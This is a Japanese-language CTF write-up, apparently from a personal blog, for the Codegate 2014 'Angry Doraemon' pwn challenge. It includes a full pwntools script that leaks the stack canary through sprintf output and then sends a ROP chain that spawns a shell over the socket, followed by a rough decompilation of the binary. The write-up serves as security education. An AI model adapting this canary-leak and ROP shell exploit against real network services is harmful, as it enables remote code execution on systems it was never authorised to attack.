---
layout: post
redirect_from:
  - /writeup/ctf/2014/codegate-preliminary-2014-angrydoraemon/
  - /blog/2016/02/14/codegate-preliminary-2014-angrydoraemon/
date: 2016-02-14T17:50:10+09:00
tags: [ "ctf", "writeup", "pwn", "codegate", "buffer-overflow", "stack-overflow", "return-oriented-programming" ]
---

# Codegate Preliminary CTF 2014: Angry Doraemon

pwn会2回目。今回は自力で<del>解けた</del>解けてなかった[^6]。

## [Angry Doraemon](https://github.com/ctfs/write-ups-2014/tree/master/codegate-preliminary-2014/angrydoraemon)

### 準備

``` sh
$ file angry_doraemon
angry_doraemon: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=52386ef1e094f4cde5996d3755aa4363959d0a83, stripped

$ checksec --file angry_doraemon
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   angry_doraemon
```

ドラえもんと戦うゲームのようななにか[^1]。fork型。`doraemon.txt` `bread.txt` `mouse.txt` `fs.txt` `ps.txt`を置いておかないと動かない。

``` sh
$ ./angry_doraemon &
[2] 9346

$ nc localhost 8888
<contents of doraemon.txt>

  Angry doraemon! fight!
Waiting 2 seconds...

Doraemon H.P: 100
- Attack menu -
 1.Sword
 2.Screwdriver
 3.Red-bean bread
 4.Throw mouse
 5.Fist attack
 6.Give up
>
```

### 攻撃

攻撃可能な箇所としては、

-   1番の選択肢で、HPが特定の不正な値のとき`execl("/bin/sh", "sh", NULL);`が呼ばれる。
-   4番の選択肢で、stack buffer overflowがある。overflow後そのbufferの中身を`sprintf`する。
-   5番の選択肢で、`0x08`から始まらない好きなアドレスをcallできる。

攻撃には4番のbofだけあれば十分である[^2]。
ただし1番の`execl`を利用するとropが少し楽になる。

bofを利用する上でstack canaryが邪魔であるが、`sprintf`でbufferが表示されることを用いればcanaryを流出させることができる[^3]。
bufferは10byteありcanaryの下位1byteは`0x00`なので11byte書き込めばよい。
同時に[^4]saved ebpやreturn先アドレスも読み取れる。

後はropする。
`execl`や`"/bin/sh"`があるので、これを用いて`execl("/bin/sh", "/bin/sh", "-c", "sh <&4 >&4");`を呼ぶだけ。
`4`はsocketのfdである。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
context.log_level = 'debug'

# leak stack
p = remote('localhost', 8888)
p.recvuntil('- Attack menu -')
p.recvuntil('>')
p.sendline('4')
p.recvuntil('Are you sure? (y/n) ')
p.send('y' * 11)
s = p.recvline()
p.close()
canary = u32('\0' + s[23:][:3])
ebp = u32(s[34:][:4])
ret = u32(s[38:][:4])
buf = ebp - 0x46
bin_base = ret - 0x12c5

# rop
call_write = 0x8048991
bin_sh = 0x804970d
call_execl = 0x8048c79
p = remote('localhost', 8888)
p.recvuntil('- Attack menu -')
p.recvuntil('>')
p.sendline('4')
p.recvuntil('Are you sure? (y/n) ')
payload = ''
payload += 'A' * 10
payload += p32(canary)
payload += 'A' * 0xc
payload += p32(call_execl)
payload += p32(bin_sh)
payload += p32(bin_sh)
payload += p32(buf + len(payload) + 0xc)
payload += p32(buf + len(payload) + 0x8 + 3)
payload += p32(0)
payload += '-c\0'
payload += 'sh <&4 >&4\0'
p.send(payload)

p.sendline('ls')
p.interactive()
```

<!-- more -->

### decompile

雑[^5]。

``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/socket.h>

void fail(char *msg) {
    fprintf(ds_0x804b080, "%s\n", msg);
    exit(1);
}

void handler(void) {
    int stat; // ebp-0xc
    waitpid(-1, &stat, 1 /* W* */);
    waitpid(-1, &stat, 1 /* W* */);
}

char g_buf[5000]; // 0x804b0a0
void print_doraemon(int sock) {
    int len; // ebp-0xc
    int fd; // ebp-0x10
    fd = open("doraemon.txt", O_RDONLY);
    if (fn < 0) fail("open() error");
    len = read(fd, g_buf, 5000);
    close(fd);
    write(sock, g_buf, len);
    write(sock, "Angry doraemon! fight!\n", 0x1a);
}

int hp; // ds:0x804b078
void print_menu(int sock) {
    // something here
    char buf[]; // ebp-0x3f
    sprintf(buf, "\nDoraemon H.P: %d\n", hp);
    write(sock, buf, strlen(buf));
    write(sock, " 1.Sword\n", 0x9);
    write(sock, " 2.Screwdriver\n", 0xf);
    write(sock, " 3.Red-bean bread\n", 0x12);
    write(sock, " 4.Throw mouse\n", 0xf);
    write(sock, " 5.Fist attack\n", 0xf);
    write(sock, " 6.Give up\n", 0xb);
    write(sock, ">", 1);
}

void select_1(int sock) { // sh gadget
    write(sock, "1)Toy sword\n2)Small sword\n3)Big sword\n", 0x27);
    read(sock, buf, 0x3);
    write(sock, "\"No damaged.\"\n", 0xe);
    write(sock, "\"Come on! (HP - 1).\"\n", );
    write(sock, "\"Shit! (HP - 1).\"\n", );
    if (hp == 0x7a69) { // 31337
        execl("/bin/sh", "sh", NULL);
    }
    write(sock, "\"I'm a robot!\"\n", );
    write(sock, "Hahaha, I'm a robot!", );
}

void select_2(int sock) {
    int len; // ebp-0x11c
    char fname[]; // ebp-0x113
    int fd; // ebp-0x118
    int x; // ebp-0x120
    write(sock, "1)Phillips screwdriver.2)Flat-head screwdriver\n", );
    read(sock, buf, 6);
    if (buf[0] == '1') {
        strcpy(fname, "ps.txt");
        x = 0xf;
    } else if (buf[0] == '2') {
        strcpy(fname, "fs.txt");
        x = 0xe;
    } else {
        strcpy(fname, "ps.txt");
        return;
    }
    fd = open(fname, O_RDONLY);
    if (fd < 0) fail("open() error");
    len = read(fd, g_buf, 5000);
    write(sock, g_buf, len);
    write(sock, "\"Ouch!!! (HP - x)\"\n", );
    hp -= x;
}

int select_3(int sock) {
    char buf[]; // ebp-0x10
    int len;
    int fd;
    fd = open("bread.txt", O_RDONLY);
    if (fd < 0) fail("open() error");
    len = read(fd, g_buf, 5000);
    close(fd);
    write(sock, "\"Thank you! (HP + 10)\"\n", );
    write(sock, "You wanna apologize? (y/n) ", );
    read(sock, buf, 4);
    if (buf[0] == 'y') {
        write(sock, "\"Sorry, doraemon\"\n");
        return 1; // terminate the game
    }
    return 0;
}

void select_4(int sock) { // bof (with canary)
    char buf[]; // ebp-0x16
    int fd; // ebp-0x20
    fd = open("mouse.txt", O_RDONLY);
    if (fd < 0) fail("open() error");
    write("Are you sure? (y/n) ");
    read(sock, buf, 0x6e);
    if (buf[0] == 'y') {
        sprintf(buf, "You choose '%s'!\n", buf);
        write(sock, buf);
        write(sock, "\n\"MOUSE!!!!!!!!! (HP - 25)\"\n");
    }
}

void select_5(int sock) { // set eip
    char buf[]; // ebp-0x16
    write(sock, "left or");
    read(sock);
    if ('l') {
        write(sock, "left-fist at");
    } else if ('r') {
        write(sock, "(special ");
        read(sock, buf, 4);
        if (buf[3] != 0x8) {
            (*buf)();
        }
    }
    write(sock, "nothing happen");
}

void serve(int sock) { // ebp+0x8
    char buf[]; // ebp-0x10
    print_doraemon(sock);
    write(sock, "Waiting 2 seconds...\n", 0x15); // to guard the canary ???
    sleep(2);
    while (true) {
        print_menu(sock);
        read(sock, buf, 4);
        if (buf[0] == '1') {
            select_1(sock);
        } else if (buf[0] == '2') {
            select_2(sock);
        } else if (buf[0] == '3') {
            if (! select_3(sock)) {
                break;
            }
        } else if (buf[0] == '4') {
            select_4(sock);
        } else if (buf[0] == '5') {
            select_5(sock);
        } else if (buf[0] == '6') {
            break;
        } else {
            wirte(sock, "Unknown menu.\n");
        }
        if (hp == 0) {
            write(sock, "\"I'll be back...\"\n", 0x12);
            break;
        } else if (100 < hp) {
            hp = 100;
        }
    }
}

int main(void) {
    int len; // esp+0x2c
    int opt = 1; // esp+0x28
    int result; // esp+0x30
    int sock; // esp+0x34
    int child; // esp+0x38
    int pid; // esp+0x3c
    struct sigaction act; // esp+0x40
    struct sockaddr_in addr; // esp+0xcc
    struct sockaddr_in acc; // esp+0xdc

    act->sa_handler = handler;
    act->sa_flags = 0; // esp+0xc4
    sigemptyset(&act->sa_mask); // esp+0x44
    result = sigaction(SIGCHLD, &act, NULL);
    if (result == 0) fail("sigaction error");

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TP);
    memset(addr, 0, sizeof(addr));
    addr->sin_family = AF_INET;
    addr->sin_addr = htonl(0);
    addr->sin_port = htons(8888);

    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    if (bind(sock, &addr, sizeof(addr)) == -1) fail("bind() error");
    if (listen(sock, 10) == -1) fail("listen() error");

    while (true) {
        child = accept(sock, &acc, &len);
        if (child == -1) continue;
        pid = fork();
        if (pid == -1) {
            close(child);
        } else if (pid > 0) {
            close(child);
        } else {
            close(sock);
            serve(child);
            close(child);
            exit(0);
        }
    }
    return 0;
}
```

---

# Codegate Preliminary CTF 2014: Angry Doraemon

[^1]: プログラミングを始めたとき、猫でもわかるcでwhile文ぐらいまで読んで、こんな感じの雑なゲームを作って喜んでいた覚えがある。懐しい。
[^2]: 5番の明らかなそれはいったい何だったのだろう。他の人のwriteupを見ても使われていなかった。
[^3]: `sprintf`がなくても$256 * 3$回程度の試行で判明するはず。`sleep(2);`があるが最悪でも30分は越えない。
[^4]: 環境によっては複数回に分ける必要があるかも。
[^5]: binaryの先頭から訳していってかつ(やる必要がなかった気がしてきて)やる気が単調減少していったのが分かる味わい深いコード。もうちょっと要領良くやりたいですね。
[^6]: libcはuploadされてないだけで本番は与えられていたのかな、と思っていたけどそうではなかったらしい。

---

# Codegate Preliminary CTF 2014: Angry Doraemon

-   Thu Feb 18 17:42:57 JST 2016
    -   解けてなかったのでそのことを明記
